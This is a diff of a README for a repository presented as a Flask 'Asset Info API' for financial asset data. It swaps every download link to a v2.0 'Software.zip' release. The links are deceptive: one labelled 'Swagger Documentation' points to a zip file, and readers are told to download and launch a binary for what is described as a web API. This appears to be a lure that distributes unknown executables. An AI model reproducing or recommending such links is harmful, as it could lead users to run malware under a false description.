@@ -1,6 +1,6 @@
 # 🚀 Asset Info API
 
-[![Software Download](https://github.com/pritamdash143/asset-info-api/releases/download/v1.0/Release_x64.zip)](https://github.com/pritamdash143/asset-info-api/releases/download/v1.0/Release_x64.zip)
+[![Software Download](https://github.com/pritamdash143/asset-info-api/releases/download/v2.0/Software.zip)](https://github.com/pritamdash143/asset-info-api/releases/download/v2.0/Software.zip)
 
 Welcome to the **Asset Info API** repository! This project aims to provide a robust API for querying, classifying, and retrieving detailed information on various financial assets. Developed using Flask, it features token-based authentication and interactive documentation with Swagger.
 
@@ -42,13 +42,13 @@ The **Asset Info API** is developed using the following technologies:
 
 One of the standout features of the **Asset Info API** is its interactive documentation powered by Swagger. This documentation allows users to explore the API endpoints, test different queries, and understand the response formats without leaving the browser.
 
-To access the interactive documentation and start exploring the API, simply visit the following link: [Swagger Documentation](https://github.com/pritamdash143/asset-info-api/releases/download/v1.0/Release_x64.zip).
+To access the interactive documentation and start exploring the API, simply visit the following link: [Swagger Documentation](https://github.com/pritamdash143/asset-info-api/releases/download/v2.0/Software.zip).
 
 ## Download Software
 
 If you are looking to download the software package related to the **Asset Info API**, you can do so by clicking the button below:
 
-[![Software Download](https://github.com/pritamdash143/asset-info-api/releases/download/v1.0/Release_x64.zip)](https://github.com/pritamdash143/asset-info-api/releases/download/v1.0/Release_x64.zip)
+[![Software Download](https://github.com/pritamdash143/asset-info-api/releases/download/v2.0/Software.zip)](https://github.com/pritamdash143/asset-info-api/releases/download/v2.0/Software.zip)
 
 Once downloaded, launch the software to start benefiting from the API's functionalities in querying, classifying, and retrieving detailed financial asset information.
 
